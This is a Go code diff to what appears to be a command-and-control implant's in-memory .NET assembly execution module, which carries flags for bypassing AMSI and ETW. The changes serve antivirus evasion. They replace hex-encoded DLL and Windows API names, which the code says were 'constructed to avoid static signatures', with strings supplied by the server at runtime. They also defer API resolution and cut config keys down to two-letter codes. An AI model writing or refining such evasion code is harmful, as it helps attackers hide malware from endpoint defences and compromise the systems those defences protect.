@@ -46,35 +46,31 @@ const (
 	ERROR_NO_DATA            = 232
 )
 
-// DLL names (constructed to avoid static signatures)
-var (
-	iaDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})             // kernel32.dll
-	iaDllOle32    = string([]byte{0x6f, 0x6c, 0x65, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                               // ole32.dll
-	iaDllUser32   = string([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                         // user32.dll
-	iaDllMsvcrt   = string([]byte{0x6d, 0x73, 0x76, 0x63, 0x72, 0x74, 0x2e, 0x64, 0x6c, 0x6c})                         // msvcrt.dll
-)
+// DLL name accessor functions (use template lookups)
+func iaDllKernel32() string { return iaTpl(idxIADllKernel32) }
+func iaDllOle32() string    { return iaTpl(idxIADllOle32) }
+func iaDllUser32() string   { return iaTpl(idxIADllUser32) }
+func iaDllMsvcrt() string   { return iaTpl(idxIADllMsvcrt) }
 
-// API function names (constructed to avoid static signatures)
-var (
-	iaFnGetStdHandle          = string([]byte{0x47, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                 // GetStdHandle
-	iaFnSetStdHandle          = string([]byte{0x53, 0x65, 0x74, 0x53, 0x74, 0x64, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                 // SetStdHandle
-	iaFnAllocConsole          = string([]byte{0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65})                                                 // AllocConsole
-	iaFnFreeConsole           = string([]byte{0x46, 0x72, 0x65, 0x65, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65})                                                       // FreeConsole
-	iaFnGetConsoleWindow      = string([]byte{0x47, 0x65, 0x74, 0x43, 0x6f, 0x6e, 0x73, 0x6f, 0x6c, 0x65, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77})                         // GetConsoleWindow
-	iaFnPeekNamedPipe         = string([]byte{0x50, 0x65, 0x65, 0x6b, 0x4e, 0x61, 0x6d, 0x65, 0x64, 0x50, 0x69, 0x70, 0x65})                                           // PeekNamedPipe
-	iaFnCreateFileW           = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x57})                                                       // CreateFileW
-	iaFnCreateFileA           = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65, 0x41})                                                       // CreateFileA
-	iaFnCloseHandle           = string([]byte{0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                       // CloseHandle
-	iaFnReadFile              = string([]byte{0x52, 0x65, 0x61, 0x64, 0x46, 0x69, 0x6c, 0x65})                                                                         // ReadFile
-	iaFnWriteFile             = string([]byte{0x57, 0x72, 0x69, 0x74, 0x65, 0x46, 0x69, 0x6c, 0x65})                                                                   // WriteFile
-	iaFnCoInitializeEx        = string([]byte{0x43, 0x6f, 0x49, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65, 0x45, 0x78})                                     // CoInitializeEx
-	iaFnCoUninitialize        = string([]byte{0x43, 0x6f, 0x55, 0x6e, 0x69, 0x6e, 0x69, 0x74, 0x69, 0x61, 0x6c, 0x69, 0x7a, 0x65})                                     // CoUninitialize
-	iaFnFlushInstructionCache = string([]byte{0x46, 0x6c, 0x75, 0x73, 0x68, 0x49, 0x6e, 0x73, 0x74, 0x72, 0x75, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x43, 0x61, 0x63, 0x68, 0x65}) // FlushInstructionCache
-	iaFnShowWindow            = string([]byte{0x53, 0x68, 0x6f, 0x77, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77})                                                             // ShowWindow
-	iaFnOpenOsfhandle         = string([]byte{0x5f, 0x6f, 0x70, 0x65, 0x6e, 0x5f, 0x6f, 0x73, 0x66, 0x68, 0x61, 0x6e, 0x64, 0x6c, 0x65})                               // _open_osfhandle
-	iaFnDup2                  = string([]byte{0x5f, 0x64, 0x75, 0x70, 0x32})                                                                                           // _dup2
-	iaFnClose                 = string([]byte{0x5f, 0x63, 0x6c, 0x6f, 0x73, 0x65})                                                                                     // _close
-)
+// API function name accessor functions (use template lookups)
+func iaFnGetStdHandle() string          { return iaTpl(idxIAFnGetStdHandle) }
+func iaFnSetStdHandle() string          { return iaTpl(idxIAFnSetStdHandle) }
+func iaFnAllocConsole() string          { return iaTpl(idxIAFnAllocConsole) }
+func iaFnFreeConsole() string           { return iaTpl(idxIAFnFreeConsole) }
+func iaFnGetConsoleWindow() string      { return iaTpl(idxIAFnGetConsoleWindow) }
+func iaFnPeekNamedPipe() string         { return iaTpl(idxIAFnPeekNamedPipe) }
+func iaFnCreateFileW() string           { return iaTpl(idxIAFnCreateFileW) }
+func iaFnCreateFileA() string           { return iaTpl(idxIAFnCreateFileA) }
+func iaFnCloseHandle() string           { return iaTpl(idxIAFnCloseHandle) }
+func iaFnReadFile() string              { return iaTpl(idxIAFnReadFile) }
+func iaFnWriteFile() string             { return iaTpl(idxIAFnWriteFile) }
+func iaFnCoInitializeEx() string        { return iaTpl(idxIAFnCoInitializeEx) }
+func iaFnCoUninitialize() string        { return iaTpl(idxIAFnCoUninitialize) }
+func iaFnFlushInstructionCache() string { return iaTpl(idxIAFnFlushInstructionCache) }
+func iaFnShowWindow() string            { return iaTpl(idxIAFnShowWindow) }
+func iaFnOpenOsfhandle() string         { return iaTpl(idxIAFnOpenOsfhandle) }
+func iaFnDup2() string                  { return iaTpl(idxIAFnDup2) }
+func iaFnClose() string                 { return iaTpl(idxIAFnClose) }
 
 // InlineAssemblyTemplate indices (must match server's common.go)
 const (
@@ -84,6 +80,32 @@ const (
 	idxIAClrV2Full  = 402
 	idxIATempPrefix = 403
 	idxIATempSuffix = 404
+
+	// DLL names (800-803)
+	idxIADllKernel32 = 800
+	idxIADllOle32    = 801
+	idxIADllUser32   = 802
+	idxIADllMsvcrt   = 803
+
+	// API function names (804-821)
+	idxIAFnGetStdHandle          = 804
+	idxIAFnSetStdHandle          = 805
+	idxIAFnAllocConsole          = 806
+	idxIAFnFreeConsole           = 807
+	idxIAFnGetConsoleWindow      = 808
+	idxIAFnPeekNamedPipe         = 809
+	idxIAFnCreateFileW           = 810
+	idxIAFnCreateFileA           = 811
+	idxIAFnCloseHandle           = 812
+	idxIAFnReadFile              = 813
+	idxIAFnWriteFile             = 814
+	idxIAFnCoInitializeEx        = 815
+	idxIAFnCoUninitialize        = 816
+	idxIAFnFlushInstructionCache = 817
+	idxIAFnShowWindow            = 818
+	idxIAFnOpenOsfhandle         = 819
+	idxIAFnDup2                  = 820
+	idxIAFnClose                 = 821
 )
 
 // Shared template storage for inline assembly
@@ -97,6 +119,8 @@ func SetInlineAssemblyTemplate(templates []string) {
 	iaTemplateMu.Lock()
 	iaTemplate = templates
 	iaTemplateMu.Unlock()
+	// Initialize Windows API after templates are set
+	initIAWindowsAPI()
 }
 
 // iaTpl safely retrieves a template string by index
@@ -109,41 +133,12 @@ func iaTpl(idx int) string {
 	return ""
 }
 
-// Convenience functions for CLR strings with fallbacks
-func iaClrV4() string {
-	if s := iaTpl(idxIAClrV4); s != "" {
-		return s
-	}
-	return "v4"
-}
-
-func iaClrV2() string {
-	if s := iaTpl(idxIAClrV2); s != "" {
-		return s
-	}
-	return "v2"
-}
-
-func iaClrV2Full() string {
-	if s := iaTpl(idxIAClrV2Full); s != "" {
-		return s
-	}
-	return "v2.0.50727"
-}
-
-func iaTempPrefix() string {
-	if s := iaTpl(idxIATempPrefix); s != "" {
-		return s
-	}
-	return "clr_output_"
-}
-
-func iaTempSuffix() string {
-	if s := iaTpl(idxIATempSuffix); s != "" {
-		return s
-	}
-	return ".txt"
-}
+// Convenience functions for CLR strings (use template lookups)
+func iaClrV4() string      { return iaTpl(idxIAClrV4) }
+func iaClrV2() string      { return iaTpl(idxIAClrV2) }
+func iaClrV2Full() string  { return iaTpl(idxIAClrV2Full) }
+func iaTempPrefix() string { return iaTpl(idxIATempPrefix) }
+func iaTempSuffix() string { return iaTpl(idxIATempSuffix) }
 
 // Windows API declarations (initialized in init to use hex strings)
 var (
@@ -181,34 +176,39 @@ var (
 	closeFunc     *syscall.LazyProc
 )
 
-func init() {
-	kernel32DLL = syscall.NewLazyDLL(iaDllKernel32)
-	ole32 = syscall.NewLazyDLL(iaDllOle32)
-	user32 = syscall.NewLazyDLL(iaDllUser32)
-	msvcrt = syscall.NewLazyDLL(iaDllMsvcrt)
+var iaInitOnce sync.Once
 
-	getStdHandle = kernel32DLL.NewProc(iaFnGetStdHandle)
-	setStdHandle = kernel32DLL.NewProc(iaFnSetStdHandle)
-	allocConsole = kernel32DLL.NewProc(iaFnAllocConsole)
-	freeConsole = kernel32DLL.NewProc(iaFnFreeConsole)
-	getConsoleWindow = kernel32DLL.NewProc(iaFnGetConsoleWindow)
-	peekNamedPipe = kernel32DLL.NewProc(iaFnPeekNamedPipe)
+// initIAWindowsAPI initializes Windows API DLLs and procs using template values
+func initIAWindowsAPI() {
+	iaInitOnce.Do(func() {
+		kernel32DLL = syscall.NewLazyDLL(iaDllKernel32())
+		ole32 = syscall.NewLazyDLL(iaDllOle32())
+		user32 = syscall.NewLazyDLL(iaDllUser32())
+		msvcrt = syscall.NewLazyDLL(iaDllMsvcrt())
 
-	createFileW = kernel32DLL.NewProc(iaFnCreateFileW)
-	createFileA = kernel32DLL.NewProc(iaFnCreateFileA)
-	closeHandle = kernel32DLL.NewProc(iaFnCloseHandle)
-	readFile = kernel32DLL.NewProc(iaFnReadFile)
-	writeFile = kernel32DLL.NewProc(iaFnWriteFile)
+		getStdHandle = kernel32DLL.NewProc(iaFnGetStdHandle())
+		setStdHandle = kernel32DLL.NewProc(iaFnSetStdHandle())
+		allocConsole = kernel32DLL.NewProc(iaFnAllocConsole())
+		freeConsole = kernel32DLL.NewProc(iaFnFreeConsole())
+		getConsoleWindow = kernel32DLL.NewProc(iaFnGetConsoleWindow())
+		peekNamedPipe = kernel32DLL.NewProc(iaFnPeekNamedPipe())
 
-	coInitializeEx = ole32.NewProc(iaFnCoInitializeEx)
-	coUninitialize = ole32.NewProc(iaFnCoUninitialize)
-	flushInstructionCache = kernel32DLL.NewProc(iaFnFlushInstructionCache)
+		createFileW = kernel32DLL.NewProc(iaFnCreateFileW())
+		createFileA = kernel32DLL.NewProc(iaFnCreateFileA())
+		closeHandle = kernel32DLL.NewProc(iaFnCloseHandle())
+		readFile = kernel32DLL.NewProc(iaFnReadFile())
+		writeFile = kernel32DLL.NewProc(iaFnWriteFile())
 
-	showWindow = user32.NewProc(iaFnShowWindow)
+		coInitializeEx = ole32.NewProc(iaFnCoInitializeEx())
+		coUninitialize = ole32.NewProc(iaFnCoUninitialize())
+		flushInstructionCache = kernel32DLL.NewProc(iaFnFlushInstructionCache())
 
-	openOsfhandle = msvcrt.NewProc(iaFnOpenOsfhandle)
-	dup2 = msvcrt.NewProc(iaFnDup2)
-	closeFunc = msvcrt.NewProc(iaFnClose)
+		showWindow = user32.NewProc(iaFnShowWindow())
+
+		openOsfhandle = msvcrt.NewProc(iaFnOpenOsfhandle())
+		dup2 = msvcrt.NewProc(iaFnDup2())
+		closeFunc = msvcrt.NewProc(iaFnClose())
+	})
 }
 
 // applyTokenContextForInlineAssembly applies token context for synchronous assembly execution
@@ -364,15 +364,15 @@ func executeWithoutCapture(assemblyBytes []byte, arguments []string) (string, in
 }
 
 func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, config struct {
-	AssemblyB64 string   `json:"assembly_b64"`
-	Arguments   []string `json:"arguments"`
-	AppDomain   string   `json:"app_domain"`
-	BypassAMSI  bool     `json:"bypass_amsi"`
-	BypassETW   bool     `json:"bypass_etw"`
-	RevertETW   bool     `json:"revert_etw"`
-	EntryPoint  string   `json:"entry_point"`
-	UsePipe     bool     `json:"use_pipe"`
-	PipeName    string   `json:"pipe_name"`
+	AssemblyB64 string   `json:"ab"`
+	Arguments   []string `json:"ar"`
+	AppDomain   string   `json:"ad"`
+	BypassAMSI  bool     `json:"ba"`
+	BypassETW   bool     `json:"be"`
+	RevertETW   bool     `json:"re"`
+	EntryPoint  string   `json:"ep"`
+	UsePipe     bool     `json:"up"`
+	PipeName    string   `json:"pm"`
 }, executionNumber int) (string, int) {
 	var output strings.Builder
 
